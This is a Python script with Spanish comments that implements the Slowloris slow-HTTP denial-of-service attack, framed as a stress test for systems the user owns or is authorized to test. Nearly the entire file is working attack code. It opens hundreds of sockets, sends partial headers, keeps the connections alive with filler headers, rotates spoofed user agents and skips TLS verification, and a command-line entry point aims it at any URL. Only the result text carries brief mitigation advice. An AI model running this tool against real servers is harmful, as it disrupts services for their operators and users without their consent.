"""
Slowloris - Ataque HTTP lento para pruebas de estrés
Solo para uso en sistemas propios o con autorización explícita
"""

import socket
import random
import time
import asyncio
from dataclasses import dataclass, field
from typing import List, Optional
from urllib.parse import urlparse
import ssl


@dataclass
class SlowlorisResult:
    target: str
    port: int
    sockets_created: int
    sockets_alive: int
    duration: float
    vulnerable: bool
    details: List[str] = field(default_factory=list)
    recommendations: List[str] = field(default_factory=list)


class SlowlorisAttacker:
    """
    Implementa el ataque Slowloris para pruebas de estrés
    
    Slowloris mantiene conexiones HTTP abiertas enviando headers parciales
    muy lentamente, consumiendo recursos del servidor sin generar mucho tráfico.
    """
    
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"
    ]
    
    def __init__(self):
        self.sockets: List[socket.socket] = []
        self.running = False
        self.stats = {
            "created": 0,
            "alive": 0,
            "closed": 0,
            "errors": 0
        }
    
    def _create_socket(self, host: str, port: int, use_ssl: bool = False) -> Optional[socket.socket]:
        """Crea un socket y envía headers HTTP parciales"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            
            sock.connect((host, port))
            
            user_agent = random.choice(self.USER_AGENTS)
            request = f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n"
            request += f"Host: {host}\r\n"
            request += f"User-Agent: {user_agent}\r\n"
            request += "Accept-Language: en-US,en;q=0.5\r\n"
            
            sock.send(request.encode("utf-8"))
            self.stats["created"] += 1
            
            return sock
            
        except Exception as e:
            self.stats["errors"] += 1
            return None
    
    def _keep_alive(self, sock: socket.socket) -> bool:
        """Envía un header parcial para mantener la conexión abierta"""
        try:
            header = f"X-a: {random.randint(1, 5000)}\r\n"
            sock.send(header.encode("utf-8"))
            return True
        except:
            return False
    
    def analyze(self, url: str, socket_count: int = 200, duration: int = 30) -> SlowlorisResult:
        """
        Ejecuta un análisis Slowloris contra el objetivo
        
        Args:
            url: URL del objetivo
            socket_count: Número de sockets a crear
            duration: Duración de la prueba en segundos
        """
        parsed = urlparse(url)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_ssl = parsed.scheme == "https"
        
        if not host:
            return SlowlorisResult(
                target=url, port=0, sockets_created=0, sockets_alive=0,
                duration=0, vulnerable=False, details=["URL inválida"],
                recommendations=["Proporcionar una URL válida"]
            )
        
        self.sockets = []
        self.running = True
        self.stats = {"created": 0, "alive": 0, "closed": 0, "errors": 0}
        
        start_time = time.time()
        details = []
        
        details.append(f"Iniciando Slowloris contra {host}:{port}")
        details.append(f"Objetivo: mantener {socket_count} conexiones abiertas por {duration}s")
        
        for i in range(socket_count):
            if not self.running:
                break
            sock = self._create_socket(host, port, use_ssl)
            if sock:
                self.sockets.append(sock)
        
        details.append(f"Sockets creados inicialmente: {len(self.sockets)}")
        
        elapsed = 0
        keep_alive_rounds = 0
        
        while elapsed < duration and self.running:
            keep_alive_rounds += 1
            
            for sock in list(self.sockets):
                if not self._keep_alive(sock):
                    self.sockets.remove(sock)
                    self.stats["closed"] += 1
            
            while len(self.sockets) < socket_count and self.running:
                sock = self._create_socket(host, port, use_ssl)
                if sock:
                    self.sockets.append(sock)
                else:
                    break
            
            self.stats["alive"] = len(self.sockets)
            
            time.sleep(10)
            elapsed = time.time() - start_time
        
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        
        total_duration = time.time() - start_time
        
        vulnerable = self.stats["created"] > socket_count * 0.5 and self.stats["alive"] > socket_count * 0.3
        
        details.append(f"Duración total: {total_duration:.1f}s")
        details.append(f"Sockets creados: {self.stats['created']}")
        details.append(f"Sockets vivos al final: {self.stats['alive']}")
        details.append(f"Sockets cerrados: {self.stats['closed']}")
        details.append(f"Errores de conexión: {self.stats['errors']}")
        details.append(f"Rondas de keep-alive: {keep_alive_rounds}")
        
        recommendations = []
        if vulnerable:
            recommendations.append("El servidor parece vulnerable a Slowloris")
            recommendations.append("Configurar timeouts más agresivos en el servidor web")
            recommendations.append("Limitar el número de conexiones por IP")
            recommendations.append("Usar un módulo anti-slowloris (mod_reqtimeout para Apache)")
            recommendations.append("Considerar usar un reverse proxy como nginx")
        else:
            recommendations.append("El servidor resistió el ataque Slowloris")
            recommendations.append("Probablemente tiene protección anti-slowloris activa")
        
        return SlowlorisResult(
            target=url,
            port=port,
            sockets_created=self.stats["created"],
            sockets_alive=self.stats["alive"],
            duration=total_duration,
            vulnerable=vulnerable,
            details=details,
            recommendations=recommendations
        )
    
    def stop(self):
        """Detiene el ataque"""
        self.running = False
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        self.sockets = []


def main():
    import sys
    
    print("=" * 60)
    print("SLOWLORIS - Prueba de Estrés HTTP Lenta")
    print("=" * 60)
    print("\nADVERTENCIA: Solo para sistemas propios o autorizados")
    print("=" * 60)
    
    if len(sys.argv) < 2:
        print("\nUso: python slowloris.py <url> [sockets] [duracion]")
        print("Ejemplo: python slowloris.py https://mi-sitio.com 200 30")
        sys.exit(1)
    
    url = sys.argv[1]
    sockets = int(sys.argv[2]) if len(sys.argv) > 2 else 200
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 30
    
    attacker = SlowlorisAttacker()
    result = attacker.analyze(url, sockets, duration)
    
    print(f"\nResultado: {'VULNERABLE' if result.vulnerable else 'PROTEGIDO'}")
    for detail in result.details:
        print(f"  {detail}")


if __name__ == "__main__":
    main()
